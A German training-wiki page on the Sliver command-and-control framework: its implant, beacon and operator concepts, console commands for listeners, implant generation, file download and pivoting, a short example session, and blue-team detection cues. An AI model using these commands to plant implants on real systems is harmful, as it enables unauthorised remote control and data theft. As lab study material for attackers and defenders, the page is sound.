# Sliver (C2)

**Kategorie:** Command & Control Framework (Open Source)

Legitim nutzbares Open-Source-C2 (BishopFox). Verwaltet kompromittierte Hosts zentral: **Implant/Beacon** auf dem Ziel „beacont" zum **Server**, der **Operator** steuert über die Konsole. Mehrere Transporte (mTLS, HTTP(S), DNS, WireGuard), Tasking, Pivoting, Datei-/Credential-Module. Gut zum **Verstehen und Erkennen** von C2.

```bash
sliver-server          # Server + Operator-Konsole
```

## Wichtige Konsolen-Befehle

| Befehl | Bedeutung |
|--------|-----------|
| `https --lhost <KALI>` / `mtls` / `dns` | Listener starten |
| `generate --http <KALI> --os linux --save <pfad>` | Session-Implant bauen |
| `generate beacon --http <KALI> --seconds 60 --jitter 30 ...` | Beacon-Implant |
| `sessions` / `beacons` | aktive Implants |
| `use <id>` | Implant steuern |
| `ls`, `download`, `execute`, `socks5 start`, `pivots` | Tasking/Pivoting |

## Beispiel

```bash
sliver > https --lhost <KALI>
sliver > generate --http <KALI> --os linux --arch amd64 --save /tmp/implant
# implant aufs Ziel bringen + ausführen
sliver > sessions
sliver > use <id>
sliver (IMPLANT) > execute -o id
```

## Detection (Blue Team)

**Beaconing** (regelmäßige Intervalle + Jitter), auffällige **JA3/TLS-Fingerprints**, untypische User-Agents/URIs, langlebige Outbound-Verbindungen, DNS-C2-Muster → NDR/EDR/SIEM, Egress/Proxy-Policy, TLS-Inspection.

## Hinweis

Mächtige Fernsteuerung → **nur isoliertes Eigen-Lab**; Implants/Server nach der Übung entfernen. Cobalt Strike ist das kommerzielle Pendant (hier nicht nötig).

## Verwendet in

post-exploitation-pivoting 09 (C2-Frameworks), 10.
